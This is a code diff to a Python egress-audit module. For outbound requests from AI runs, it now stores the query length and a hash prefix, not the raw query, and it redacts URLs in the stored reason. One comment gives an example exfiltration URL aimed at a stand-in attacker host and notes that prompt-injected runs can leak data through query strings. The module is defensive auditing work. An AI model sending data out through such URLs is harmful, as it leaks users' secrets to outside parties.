@@ -11,9 +11,13 @@ Two tiers, deliberately not one:
   persists in full (`runs.routing`, `runs.model_used`, the transcript), and the
   provider stream has no database session to write it with anyway.
 
-Query strings are dropped, never stored. They carry API keys and search terms
-that are often the private part of a question, and a host plus a path answers
-the audit question without becoming a second place secrets accumulate.
+Query strings are never stored. They carry API keys and search terms that are
+often the private part of a question, and a host plus a path answers the audit
+question without becoming a second place secrets accumulate. What the row keeps
+instead is the query's length and a short SHA-256 prefix, because a query is also
+the cheapest exfiltration channel a prompt-injected run has
+(`attacker.example/?d=<data>`): the size says how much could have left, the hash
+says whether two requests carried the same thing.
 
 The in-process counters live in `audit_base.py` — DB-free, so `tret.net.client`
 can note an attempt without importing SQLAlchemy — and are re-exported here
@@ -34,7 +38,10 @@ from tret.net.audit_base import (
     counters,
     log,
     note_attempt,
+    query_fingerprint,
+    redact_urls,
     reset_counters,
+    strip_query,
 )
 
 __all__ = [
@@ -44,9 +51,12 @@ __all__ = [
     "counters",
     "log",
     "note_attempt",
+    "query_fingerprint",
+    "redact_urls",
     "record",
     "record_durably",
     "reset_counters",
+    "strip_query",
 ]
 
 
@@ -64,6 +74,7 @@ async def record(
     byte_count: int = 0,
     duration_ms: int = 0,
     reason: str | None = None,
+    query: str | None = None,
 ) -> EgressCall:
     """Persist one research-class call. The caller commits.
 
@@ -73,6 +84,7 @@ async def record(
     row. Denials are recorded exactly like successes: a refused request is the
     most interesting line in this table.
     """
+    query_length, query_sha256 = query_fingerprint(query) if query is not None else (None, None)
     row = EgressCall(
         run_id=run_id,
         project_id=project_id,
@@ -84,7 +96,9 @@ async def record(
         byte_count=byte_count,
         duration_ms=duration_ms,
         decision=decision,
-        reason=reason,
+        reason=redact_urls(reason),  # backstop: no URL query in any column
+        query_length=query_length,
+        query_sha256=query_sha256,
     )
     db.add(row)
     await db.flush()
